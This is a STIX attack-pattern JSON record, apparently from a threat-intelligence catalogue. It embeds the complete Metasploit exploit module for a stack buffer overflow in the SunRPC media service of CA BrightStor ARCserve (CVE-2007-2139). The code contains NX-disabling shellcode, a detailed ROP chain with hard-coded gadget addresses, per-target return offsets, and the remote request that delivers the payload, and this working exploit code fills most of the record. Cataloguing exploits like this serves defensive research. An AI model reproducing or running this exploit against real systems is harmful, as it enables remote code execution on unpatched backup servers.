{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fa9f693-cd69-479d-b9f3-fcc65ca79f18",
    "created": "2024-08-14T16:48:14.477014Z",
    "modified": "2024-08-14T16:48:14.477018Z",
    "name": "CA BrightStor ArcServe Media Service Stack Buffer Overflow",
    "description": " This exploit targets a stack buffer overflow in the MediaSrv RPC service of CA BrightStor ARCserve. By sending a specially crafted SUNRPC request, an attacker can overflow a stack buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/mediasrv_sunrpc.rb",
            "external_id": "mediasrv_sunrpc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2139"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::SunRPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ArcServe Media Service Stack Buffer Overflow',\n      'Description'    => %q{\n          This exploit targets a stack buffer overflow in the MediaSrv RPC service of CA\n        BrightStor ARCserve. By sending a specially crafted SUNRPC request, an attacker\n        can overflow a stack buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'toto' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-2139'],\n          [ 'OSVDB', '35326' ],\n          [ 'BID', '23635'],\n          [ 'ZDI', '07-022'],\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 0x300,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c_\",\n          'Prepend' =>\n              # Disable NX on 2k3 to upload data on the stack\n              # (service crashes if the stack is switched to the heap)\n              \"\\x64\\x8b\\x0d\\x30\\x00\\x00\\x00\"              + # mov ecx, dword ptr fs:[0x30] ; PEB\n              \"\\x83\\xb9\\xa4\\x00\\x00\\x00\\x05\"              + # cmp dword ptr [ecx+0xa4], 5  ; MajorVersion == 5\n              \"\\x75\\x30\"                                  + # jnz after\n              \"\\x83\\xb9\\xa8\\x00\\x00\\x00\\x02\"              + # cmp dword ptr [ecx+0xa8], 2  ; MinorVersion == 2\n              \"\\x75\\x27\"                                  + # jnz after\n              \"\\x81\\xb9\\xac\\x00\\x00\\x00\\xce\\x0e\\x00\\x00\"  + # cmp dword ptr [ecx+0xac], 0xece  ; BuildVersion (> SP0)\n              \"\\x76\\x1b\"                                  + # jbe after\n              \"\\x8d\\x89\\xa8\\x00\\x00\\x00\"                  + # lea ecx, [ecx+0xa8]\n              \"\\xba\\x00\\x03\\xfe\\x7f\"                      + # mov edx, 0x7ffe0300\n              \"\\xb8\\xed\\x00\\x00\\x00\"                      + # mov eax, 0xed\n              \"\\x6a\\x04\"                                  + # push 4\n              \"\\x51\"                                      + # push ecx\n              \"\\x6a\\x22\"                                  + # push 22\n              \"\\x6a\\xff\"                                  + # push -1\n              \"\\x6a\\xff\"                                  + # push -1 (padding)\n              \"\\xff\\x12\",                                   # call dword ptr[edx]\n          'StackAdjustment' => -10000,\n\n        },\n      'Targets'        =>\n        [\n          ['BrightStor Arcserve 9.0 (?) - 11.5 SP2 (Windows 2000)', { 'Ret' => 0x1002b715 , 'Off' => 0x304} ],\n          ['BrightStor Arcserve 9.0 (?) - 11.5 SP2 (Windows 2003)', { 'Ret' => 0x1002b715 , 'Off' => 0x300} ],\n          ['BrightStor Arcserve 11.1 - 11.5 SP2 (Windows All - NX Support)', { 'Ret' => 0x41414141 } ],\n        ],\n      'DisclosureDate' => '2007-04-25',\n      'DefaultTarget' => 0\n    ))\n  end\n\n  def exploit\n    sunrpc_create('tcp', 0x6097e, 1)\n\n    if target.name =~ /NX/\n      # summary:\n      #\n      # 1) get the payload address\n      # 2) copy the payload into a fixed buffer (data section)\n      # 3) allocate an executable heap buffer (to bypass NX)\n      # 4) copy back the payload into the heap\n      # 5) jmp to the payload in the heap\n      #\n      # step 1: jmp arround the atoi pointers\n      #\n      # add esp, 20h\n      # retn\n      #\n      # step 2: get a pointer to the stack in ecx\n      #\n      # xor eax, eax\n      # mov ecx, dword ptr fs:[0]\n      # cmp dword ptr [ecx+4], offset __unwind_handler\n      # jnz end\n      # [...]\n      # end:\n      # retn\n      #\n      # step 3: mov the stack pointer in eax\n      #\n      # mov eax, ecx\n      # add esp, 20h\n      # retn\n      #\n      # step 4: set fffff824h in esi\n      #\n      # pop esi\n      # retn\n      #\n      # step 5: add esi to eax (eax points to the payload in the stack)\n      #\n      # add eax, esi\n      # pop esi\n      # retn\n      #\n      # step 6: set edi to a buffer we can write (6d515301h)\n      #\n      # pop edi\n      # retn\n      #\n      # step 7: copy the payload to the buffer\n      #\n      # push eax\n      # push \tedi\n      # call _strcpy_0\n      # pop ecx\n      # pop ecx\n      # retn\n      #\n      # step 8: set ecx to ffffffh\n      #\n      # pop ecx\n      # retn\n      #\n      # step 9: mov ecx to eax (ffffffff -> MEM_EXECUTABLE)\n      #\n      # mov eax, ecx\n      # add esp, 20h\n      # retn\n      #\n      # step 10: create an executable heap\n      #\n      # push 0\n      # cmp [esp+4+arg_0], eax\n      # push 1000h\n      # setz al\n      # push eax\n      # call ds:HeapCreate    ; create a new heap (executable for NX)\n      # test eax, eax\n      # mov hHeap, eax\n      # jz short loc_6d5071b5\n      # call ___sbh_heap_init\n      # test eax, eax\n      # jnz short loc_6d5071b8\n      # push hHeap\n      # call ds:HeapDestroy\n      # loc_6d5071b5:\n      # xor eax, eax\n      # retn\n      # loc_6d5071b8:\n      # push 1\n      # pop eax\n      # retn\n      #\n      # step 11: Allocate a new heap buffer (size 01060101h)\n      #\n      # push hHeap\n      # call ds:HeapAlloc\n      # pop edi\n      # pop esi\n      # retn\n      #\n      # step 12: set esi to the buffer containing the payload  (6d515301h)\n      #\n      # pop esi\n      # retn\n      #\n      # step 13: copy the payload to the heap (executable)\n      #\n      # push esi\n      # push eax\n      # call _strcpy_0\n      # pop ecx\n      # pop ecx\n      # pop esi\n      # retn\n      #\n      # step 14: go to the heap\n      #\n      # call eax\n      #\n      # step 15:\n      # if 2k3 the prepend data disables NX to upload and execute\n      # data on the stack\n      #\n      # step 16: w00t!\n\n      data = Rex::Text.rand_text_alphanumeric(0x600)\n\n      # ret 1\n      data[ 0x100, 4 ] = [ 0x6d5010e4 ].pack('V')\n\n      # used to store the result of atoi\n      data[ 0x108, 4 ] = [ 0x6d51652b ].pack('V')\n      data[ 0x10C, 4 ] = [ 0x6d51652b ].pack('V')\n      data[ 0x110, 4 ] = [ 0x6d51652b ].pack('V')\n      data[ 0x114, 4 ] = [ 0x6d51652b ].pack('V')\n      data[ 0x118, 4 ] = [ 0x6d51652b ].pack('V')\n      data[ 0x11C, 4 ] = [ 0x6d51652b ].pack('V')\n\n      # ret 2\n      data[ 0x124, 4 ] = [ 0x6d50b27a ].pack('V')\n\n      # ret 3\n      data[ 0x128, 4 ] = [ 0x6d5010e2 ].pack('V')\n\n      # ret 4\n      data[ 0x14C, 4 ] = [ 0x6d50aa6d ].pack('V')\n      data[ 0x150, 4 ] = [ 0xfffff824 ].pack('V')\n\n      # ret 5\n      data[ 0x154, 4 ] = [ 0x6d50aa6b ].pack('V')\n\n      # ret 6\n      data[ 0x15C, 4 ] = [ 0x6d5057a0 ].pack('V')\n      data[ 0x160, 4 ] = [ 0x6d515301 ].pack('V')\n\n      # ret 7\n      data[ 0x164, 4 ] = [ 0x6d50b938 ].pack('V')\n\n      # ret 8\n      data[ 0x178, 4 ] = [ 0x6d502df0 ].pack('V')\n      data[ 0x17C, 4 ] = [ 0xffffffff ].pack('V')\n\n      # ret 9\n      data[ 0x180, 4 ] = [ 0x6d5010e2 ].pack('V')\n\n      # ret 10\n      data[ 0x1a4, 4 ] = [ 0x6d507182 ].pack('V')\n\n      # ret 11\n      data[ 0x1a8, 4 ] = [ 0x6d505c2c ].pack('V')\n      data[ 0x1ac, 4 ] = [ 0xffffffff ].pack('V')\n      data[ 0x1b0, 4 ] = [ 0x01060101 ].pack('V')\n\n      # ret 12\n      data[ 0x1bc, 4 ] = [ 0x6d50aa6d ].pack('V')\n      data[ 0x1c0, 4 ] = [ 0x6d515301 ].pack('V')\n\n      # ret 13\n      data[ 0x1c4, 4 ] = [ 0x6d50f648 ].pack('V')\n\n      # ret 14\n      data[ 0x1cc, 4 ] = [ 0x6d506867 ].pack('V')\n\n      data[ 0x260 , payload.encoded.length ] = payload.encoded\n\n    else\n      data = Rex::Text.rand_text_alphanumeric(0xA64)\n      off = target['Off']\n\n      data[ off, payload.encoded.length] = payload.encoded\n      data[ off + 0x73c, 2 ] = \"\\xeb\\x06\"\n      data[ off + 0x740, 4 ] = [ target.ret ].pack('V')\n      data[ off + 0x744, 5 ] = \"\\xe9\\xb7\\xf8\\xff\\xff\"\n    end\n\n    data = \"_\" + data + \"_1_1_1_1_1_1_1_1_1\"\n\n    request = Rex::Encoder::XDR.encode(1, 1, 2, 2, 2, data, 3, 3)\n\n    print_status(\"Trying target #{target.name}...\")\n\n    begin\n      ret = sunrpc_call(0xf5, request)\n      select(nil,nil,nil,20)\n    rescue\n    end\n\n    sunrpc_destroy\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-04-25",
    "x_mitre_platforms": [
        "win'"
    ]
}